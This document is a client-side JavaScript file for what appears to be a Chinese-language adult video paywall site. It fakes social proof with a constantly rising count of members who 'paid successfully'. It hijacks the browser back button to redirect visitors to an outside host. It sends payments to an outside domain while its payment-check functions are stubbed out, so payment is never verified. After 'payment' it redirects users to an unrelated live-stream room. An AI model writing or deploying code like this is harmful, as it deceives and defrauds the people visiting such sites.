var defaultRhost = 'p.cylqzgqb.com';
var apiurl = "/index/pay/";
var money = 48;

var curHost = window.location.hostname;
var domainPos = curHost.split('.');
if (domainPos>2){
  curHost = domainPos[domainPos-2]+'.'+domainPos[domainPos-1];
}
var cookiedomain = '.'+curHost;
var wxStuff = is_weixin() === true ? 'wx' : '';



function is_weixin(){
    var ua = navigator.userAgent.toLowerCase();
    if(ua.match(/MicroMessenger/i)=="micromessenger") {
        return true;
    } else {
        return false;
    }
}
function getDevice() {
  var sUserAgent = navigator.userAgent.toLowerCase();
  var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
  var bIsIphoneOs = sUserAgent.match(/iphone/i) == "iphone";
  var bIsWeixin = sUserAgent.match(/micromessenger/i) == "micromessenger";
  var bIsMidp = sUserAgent.match(/midp/i) == "midp";
  var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
  var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
  var bIsAndroid = sUserAgent.match(/android/i) == "android";
  var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
  var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
  if (bIsWeixin) {
    return "weixin";
  } else if (bIsAndroid) {
    return "android";
  } else if (bIsIpad || bIsIphoneOs) {
    return "ios";
  } else
    return "pc"
}

function isSafari() {
  var sUserAgent = navigator.userAgent.toLowerCase();
  return sUserAgent.match(/safari/i) == "safari";
}

//setCookie("ispay0j", 13, "d7", cookiedomain);

function vippop() {
    debug && console.log("ispay==1");
    var i = $.dialog({
        title: "恭喜您成为VIP会员",
        diagid: "sayhi",
        content: "您现在已获得：<ul><li>精心挑选的美女直播视频与女优写真</li></ul><p><small>＊本站内容仅供欣赏，不涉及非法内容，请谅解</small></p>",
        button: ["我知道了"]
    });
    ispay = _ispay = 2,
      setCookie("ispay", _ispay, "d2", cookiedomain),
      setCookie("trymp4", "", "d2", cookiedomain),
      i.on("dialog:action",
        function(i) {
           // 0 === i.index && (window.location.href = homepage + "?ispay&"+genBaseQuerystring())
          window.location.href = 'http://now.qq.com/h5/index.html?roomid=6628544&_bid=&_wv=&from=';
        })
}
function gopay() {
    "undefined" != typeof player && player.remove();
    var i = $.dialog({
        title: "温馨提示",
        content: "非会员只能试看20秒视频哦~",
        button: ["待会充", "去充值"]
    });
    i.on("dialog:action",
      function(i) {
          // 0 === i.index && (window.location.href = homepage + "?ispay&"+genBaseQuerystring())
          // 第2层回掉 先下掉
          //0 === i.index ? '': window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=check.html";
          0 === i.index ? '': window.location.href = "./check.html?" +genBaseQuerystring();
      })
}
function getNo() {
    var i = "x_a_no",
      e = 1285,
      o = getCookie(i);
    o ? (_ckno = parseInt(o) + 1, setCookie(i, _ckno, "d30", cookiedomain)) : setCookie(i, e, "d30", cookiedomain),
      o = o ? _ckno: e,
      $("#showno").html(o);
    var t = $(".ui-newstips-wrap");
    t.show().addClass("flip-top"),
      setTimeout(function() {
            t.hide()
        },
        5e3)
}
function getQuery(i) {
    var e = new RegExp("(^|&)" + i + "=([^&]*)(&|$)", "i"),
      o = window.location.search.substr(1).match(e);
    return null !== o ? decodeURI(o[2]) : null
}
function getProid() {
    var i = location.pathname;
    return arr = i.split("/"),
      arr[1]
}
function setCookie(i, e, o, d) {
    var d = d || null;
    var domain = d != null ? 'domain='+d+';' : '';

    var t = getsec(o),
      a = new Date;
    a.setTime(a.getTime() + 1 * t),
      document.cookie = i + "=" + escape(e) + ";"+domain+"path=/;expires=" + a.toGMTString()
}
function getCookie(i) {
    var e, o = new RegExp("(^| )" + i + "=([^;]*)(;|$)");
    return e = document.cookie.match(o),
      e ? e[2] : null
}
function getsec(i) {
    var e = 1 * i.substring(1, i.length),
      o = i.substring(0, 1);
    return "s" == o ? 1e3 * e: "h" == o ? 60 * e * 60 * 1e3: "d" == o ? 24 * e * 60 * 60 * 1e3: void 0
}
function delCookie(i) {
    var e = new Date;
    e.setTime(e.getTime() - 1);
    var o = getCookie(i);
    null != o && (document.cookie = i + "=" + o + ";expires=" + e.toGMTString())
}
function uuid(i, e) {
    var o, t = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""),
      a = [];
    if (e = e || t.length, i) for (o = 0; i > o; o++) a[o] = t[0 | Math.random() * e];
    else {
        var n;
        for (a[8] = a[13] = a[18] = a[23] = "-", a[14] = "4", o = 0; 36 > o; o++) a[o] || (n = 0 | 16 * Math.random(), a[o] = t[19 == o ? 3 & n | 8 : n])
    }
    return a.join("")
}
// function insertPlayer(i, e) {
//     arguments[1] || (e = "player"),
//       e = resourceDomain + "__ROOT__URL__img/m/" + e + ".jpg";
//     var o = '<video preload="auto" id="player" controls poster="' + e + '" style="width:100%;height:100%;"><source src="' + i + '" type="video/mp4"></source></video>';
//     $("#playerwrap").html(o)
// }
function insertPlayer(i, o) {
  arguments[1] || (o = "player");
  var o = resourceDomain+"img/mp4/" + o + ".jpg";
  var isAndroid = navigator.userAgent.toLowerCase().match(/android/i) == "android";
  var autoplay = ' autoplay="autoplay"';
  if(isAndroid) autoplay='';
  var e = '<video '+autoplay+' preload="auto" id="player" controls poster="' + o + '" style="width:100%;height:100%;"><source src="' + i + '" type="video/mp4"></source></video>';
  $("#playerwrap").html(e)
}

function checkPay(i, e, o, t, a) {
  return ;
    return debug && console.log("checkPay:" + i + "," + e + "," + o + "," + a),
      $.ajax({
          type: "get",
          url: i,
          async: !0,
          data: {
              apiurl: i,
              reqtype: "ispay",
              uid: e,
              proid: o,
              site: t,
              source: a
          },
          dataType: "jsonp",
          timeout: 9e4,
          success: function(i) {
              return debug && console.log("check ispay status:" + i.status),
              1e4 == i.status && (setCookie("ispay", 1, "d7", cookiedomain), vippop()),
                !0
          }
      }),
      !1
}
function requestPay(i, e, o, t, a, n, r) {
  return;
    debug && console.log("request paylink:" + i + "," + e + "," + o + "," + t + "," + a + "," + n),
      $.ajax({
          type: "get",
          url: i,
          async: !0,
          data: {
              apiurl: i,
              reqtype: "pay"+wxStuff,
              paytype: e,
              proid: t,
              uid: o,
              site: a,
              source: n
          },
          dataType: "jsonp",
          timeout: 9e4,
          success: function(p) {
              1e4 == p.status ?
                (
                  debug && console.log("get paylink status:" + p.status),
                    paylink = p.payParam,
                    setCookie("paylink", paylink, "s300", cookiedomain),
                  debug && console.log("paytype=====" + e),
                  "sm" !== e && $(".ui-btn-weixin").attr({
                      href: paylink,
                      target: "_blank"
                  }),
                  r && r.loading("hide")
                )
                :
              3 > reqcount && (debug && console.log("get paylink status:" + p.status),
                i = i == apiurl1 ? apiurl2: apiurl1, requestPay(i, e, o, t, a, n), reqcount++)
          }
      })
}
function videoLink() {
  var i = resourceDomain + "mp4/" + $(this).data("vid") + ".mp4",
    e = $(this).children("h4").children("a").html();

    if(e==null || !e) e = $(this).children("a").text();

  if ("" !== iftry || ispay > 0) {
      //window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=play.html&title=" + e + "&mp4=" + i + "&" + genBaseQuerystring();
      //第2层回掉
      window.location.href = "./play.html?title=" + e + "&mp4=" + i + "&" + genBaseQuerystring();

  } else {
    var o = '<div id="paybox"class="ui-dialog"><div class="ui-dialog-cnt" style="top:250px;position:fixed;left: 10%;"><a class="ui-icon-close-page"data-role="button"></a><div class="info"><h4>试看结束,充值VIP观看更多高清爽片</h4><p class="ui-txt-red">（只需支付一次，享受所有影片观看权限！）</p><p>VIP注意事项：<br>1.未满18岁用户，禁止购买观看。<br>2.一次性支付，享有所有影片观看权限。<br><div class="payBtn"><a class="paybtn weixin"data-role="button">确定</a></div></div></div></div>';
    $("body").append(o);
    var t = $("#paybox").dialog("show");
    t.on("dialog:action",
      function (i) {
        //第2层回掉
        //1 == i.index && (window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=check.html")
         1 == i.index && (window.location.href = "./check.html?" + "&" + genBaseQuerystring())
      })
  }
  return !1
}
function jumptowx(i) { - 1 == ispay && (ispay = 0),
  setCookie("ispay", ispay, "d7", cookiedomain);
    var e = $.dialog({
        content: "请在微信中完成支付。",
        diagid: "isok",
        button: ["完成", "去支付"]
    });
    e.on("dialog:action",
      function(e) {
          1 == e.index ? (window.location.href = i+"&"+genBaseQuerystring(), jumptowx(i)) : (setCookie("paylink", "", "d7", cookiedomain), window.location.href = homepage + "?checkok"+"&"+genBaseQuerystring())
      })
}

function getQueryString(name) {
  return getQuery(name);

  var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
  var r = window.location.search.substr(1).match(reg);
  if (r != null) {
    return unescape(r[2]);
  }
  return null;
}

function getParam(i) {
  var v = getQueryString(i);
  //console.log('getQueryString: '+i+' : '+v);
  if(v==null || v=='') v = getCookie(i);
  if(!v) v = '';
  setCookie(i,v, "d999", cookiedomain);
  return v;
}
function genBaseQuerystring(pa) {
  var q = pa;
  if(typeof pa == 'undefined' || pa){
    // q = ['uid','openid','gid','rhost','uhost','refid','ad_app_uid','ad_app_id'];
    q = ['utype','rhost','refid','ad_app_uid','ad_app_id'];
  }

  var qs = '';
  for(var x in q){
    if(x>0) qs+='&';
    var pk = q[x];
    var pv = getParam(q[x])
    qs+=pk+'='+pv;
  }
  //自定义ui版本
  qs+="&uiver=v_20160929_chen_1";
  return qs;
}

function addBaseQsToLink(){
  $('.ui-tiled li').each(function(){
    var url = $(this).attr('data-href');
    if(url.indexOf('?')<0){
      url+='?';
    }else{
      url+='&';
    }
    url+=genBaseQuerystring();
    $(this).attr('data-href',url);
  });
  $('ui-grid-trisect a').each(function(){
    var url = $(this).attr('href');
    if(url.indexOf('?')<0){
      url+='?';
    }else{
      url+='&';
    }
    url+=genBaseQuerystring();
    $(this).attr('href',url);
  });

}
addBaseQsToLink();


var resourceDomain = './';
if(typeof assetsPath!= 'undefined')resourceDomain = assetsPath;
var ispay = -1,
  proid = 0,
  uid = "",
  homepage = "./daog.html",

  site = 1,
  paytype = "my",
  source = "iw",
  debug = !1,
  inBrowser = "undefined" != typeof window && "[object Object]" !== Object.prototype.toString.call(window),
  UA = inBrowser && window.navigator.userAgent.toLowerCase(),
  isMQQBrowser = UA && UA.indexOf("mqqbrowser/") > 0,
  _uid = getCookie("uid");
// null !== _uid ? (uid = _uid, debug && console.log("get uid:" + uid)) : (_uid = uuid(16, 32), setCookie("uid", _uid, "d30", cookiedomain), debug && console.log("set uid cookie:" + _uid), uid = _uid);
var _proid = getProid();
null !== _proid ? (proid = _proid, setCookie("proid", _proid, "d30", cookiedomain)) : getCookie("proid") && (proid = getCookie("proid"));
var _ispay = getCookie("ispay");
null !== _ispay && (ispay = parseInt(_ispay), 0 === ispay && checkPay(apiurl, uid, proid, site, source)),
debug && console.log("get ispay:" + ispay);
var iftry = getCookie("trymp4");
iftry || "" === iftry || setCookie("trymp4", "try1|try2|try3|try4|try5|try6|try7|try8|try9|try10", "d999", cookiedomain),
// window.top !== window.self && (window.top.location = window.location),
debug && console.log("ispay before:" + ispay),
1 == ispay && vippop();

openid=getParam('openid');
uid=getParam('uid');
gid=getParam('gid');
rhost=getParam('rhost');
uhost=getParam('uhost');
refid=getParam('refid');
ad_app_uid=getParam('ad_app_uid');
ad_app_id=getParam('ad_app_id');

var newstips = '<div id="newstips" class="ui-newstips-wrap"><div class="ui-newstips"><i class="ui-icon-checked-s"></i><div>第<span id="showno"></span>位会员充值成功！</div></div></div>';
if ($(function() {
      1 > ispay && ($("body").append(newstips), setInterval(getNo, 1e4))
  }), $(function() {
      $("#qqvideo-overlay-0,#qqvideobridge").remove()
  }), $("#header li, footer li").on("click",
    function() {
        $(this).data("href") && (location.href = $(this).data("href"))
    }), $("#return").on("click",
    function() {
        window.location.href = homepage + "?return"
    }), !/(check|about|play)/i.test(location.pathname)) {
    var slider = new fz.Scroll(".ui-slider", {
        role: "slider",
        indicator: !0,
        autoplay: !0,
        interval: 3e3
    });
    if ($("#slider li, #vlist li, #hotVideo li").on("click", videoLink), 1 > ispay) {
        var novipfooter = '<div id="novipfooter" style="text-align:center; font-size:16px;">更多精华资源，仅限会员专享。。。</div>';
        $(function() {
            $("body").append(novipfooter),
              $("#novipfooter").on("click",
                function() {
                    //window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=check.html";
                     window.location.href = "./check.html?" + uid
                })
        })
    }
}
if (/play/i.test(location.pathname)) {
    $("#hotVideo h2").on("click",
      function() {
          window.location.href = homepage + "?hotVideo"+"&"+genBaseQuerystring()
      });
    var vtitle = getQuery("title");
    if(!vtitle || vtitle=='null') vtitle='视频播放';
    if ($("header h1").text(vtitle), $("#playerwrap").css({
          width: $(window).width() + "px",
          height: $(window).width() / 1.677 + "px"
      }), 1 > ispay) {
        $("#playTip2").html('非会员只能试看20秒，<a href="'+ "./check.html?" + uid +'">成为会员</a>观看全部').on("click",
          function() {
              //window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=check.html";
			      window.location.href = "./check.html?" + uid

          });
        var trymp4 = decodeURI(getCookie("trymp4")).split("|"),
          idx = Math.floor(Math.random() * trymp4.length);
        if (trymp4[0]) {
            var _mp4 = resourceDomain + "img/mp4/" + trymp4[idx] + ".mp4";
            debug && console.log(_mp4),
              insertPlayer(_mp4, trymp4[idx]),
              player = document.getElementById("player"),
              player.onplay = function() {
                  1 > ispay && setTimeout(gopay, 2e4)
              }
        } else gopay();
        trymp4.splice(idx, 1),
          _trymp4 = trymp4.join("|"),
          setCookie("trymp4", _trymp4, "d999", cookiedomain)
    } else if (ispay > 0) {
        $("#playTip").html("您正在观看会员专享视频，请耐心等待缓冲"),
          $("#playTip2").hide();
        var vipmp4 = getQuery("mp4");
        debug && console.log("get vip mp4:" + vipmp4),
          insertPlayer(vipmp4)
    }
}
if (/111check111/i.test(location.pathname)) {
    var img = ["b1.gif", "b2.gif"],
      idx = Math.floor(2 * Math.random()),
      videoimgHeight = $(".videoimg").width() / 1.97;
    debug && console.log(videoimgHeight),
      $(".videoimg").css("height", videoimgHeight).html('<img src="' + resourceDomain + "img/" + img[idx] + '" width="100%">'),
    debug && console.log("get paylink:" + getCookie("paylink"));
    var paylink = getCookie("paylink") ? unescape(getCookie("paylink")) : "";
    if ("" !== paylink && "sm" !== paytype) $(".ui-btn-weixin").attr({
        href: paylink,
        target: "_blank"
    });
    else {
        debug && console.log("paylink=null");
        var loading = $('<div id="payloading" class="ui-loading-block show"><div class="ui-loading-cnt"><i class="ui-loading-bright"></i><p>若长时间未跳转<br><em onclick="javascript:location.reload();">请点此刷新</em></p></div></div>').loading();
        requestPay(apiurl, paytype, uid, proid, site, source, loading)
    }
    $(".ui-btn-weixin").on("click",function() {
        window.location.href = paylink;
        if ("sm" == paytype) {
            var i = $.dialog({
                content: '<div class="scan"><img src="' + paylink + '" width="150" height="150"></img><br>截屏将二维码保存到相册<br>打开微信扫一扫<br>右上角从相册选取二维码</div>',
                button: ["点此打开微信扫一扫"]
            });
            $(".ui-dialog-cnt").prepend('<i class="ui-icon-close-page"></i>'),
              $(".ui-icon-close-page").click(function() {
                  $(this).parent().parent().removeClass("show")
              }),
              i.on("dialog:action",
                function(i) {
                    if (0 == i.index) {
                        window.location.href = "weixin://dl/scan";
                        var e = $.dialog({
                            content: "支付成功后请点击完成按钮",
                            button: ["取消", "完成"]
                        });
                        e.on("dialog:action",
                          function(i) {
                              1 == i.index && (window.location.href = "index.php?" + param)
                          })
                    }
                })
        } else {
          jumptowx(paylink);
          // "undefined" != typeof ga && ga("send", "event", "check", "wxpay", paylink ? "1" : "0");

        }

    })
}
if (/check/i.test(location.pathname)) {
  // if(is_weixin()) {
  //   $('#btn-pay-weixin').show();
  // } else {
  //   // $('#btn-pay-alipay').show();
  //   $('#btn-pay-unionpay').show();
  // }

  var img = ["b1.gif", "b2.gif"],
    idx = Math.floor(2 * Math.random()),
    videoimgHeight = $(".videoimg").width() / 1.97;
  debug && console.log(videoimgHeight),
    $(".videoimg").css("height", videoimgHeight).html('<img src="'+resourceDomain+'img/' + img[idx] + '" width="100%">'),
  debug && console.log("get paylink:" + getCookie("paylink"));
  rhost  = getParam('rhost') ? getParam('rhost'): defaultRhost;

  var apiurl = "http://"+ rhost + apiurl;
  var baseQs = genBaseQuerystring();
  var paylink=apiurl+"?"+baseQs
    + "&ruel=" + location.href + "&money="+money+'&'+baseQs ;
  if(uhost){
    var paylink=uhost+'?p='+apiurl+"?"+baseQs
      +"&ruel=" + location.href + "&money="+money+'&'+baseQs ; 
  }






console.log(paylink);


  $(".ui-btn-weixin").on("click",
    function() {
      setCookie("ispay", ispay, "d3", cookiedomain);
      if($(this).hasClass("nolink")) return ;
      
      $(".ui-btn-weixin").attr("href",paylink);
      var paytype =$(this).attr('id').split('-').pop();

      paylink += '&paytype='+paytype;
      window.location.href = paylink;
      return;
      if ("" !== paylink){
        debug && console.log("got paylink:" + $(this).data("href"));
        // jumptowx(paylink);
      }else {
        var i = $('<div id="payloading" class="ui-loading-block show"><div class="ui-loading-cnt"><i class="ui-loading-bright"></i><p>若长时间未跳转<br><em onclick="javascript:location.reload();">请点此刷新</em></p></div></div>').loading();
        debug && console.log("no paylink");
          // requestPay(apiurl, paytype, uid, proid, site, source, i)
      }
    })
}
if (/about/i.test(location.pathname)) {
    var contactus = '<details><summary class="contactus"><h3 style="display:inline-block">联系我们</h3></summary><p>如有任何意见或疑问，请联系客服</p><p><img src="' + resourceDomain + '/m/contact.jpg" height="78" width="250" alt=""></p></details>';
    ispay > 0 && $(".about").prepend(contactus)
}
var reqcount = 0;
window.onload = function(){
   window.setTimeout(function(){history.pushState(null, null, "#tuit");window.onpopstate = function(){window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid); return false;};},1000);
 	//第2层
    /**$(".ui-grid-trisect a").click(function(){
	    var a = $(this).attr('href'); 
	    window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=" + a;
		 return false; 
	  });
    **/
	
	var stime = sessionStorage.getItem("stime");
if(!stime){
	var date = new Date();
	sessionStorage.setItem("stime",date.getTime());
}else{
	var date = new Date();
	var time = Math.round((date.getTime() - stime) / 1000);
	paylink += '&time='+time;
}

	
	
}
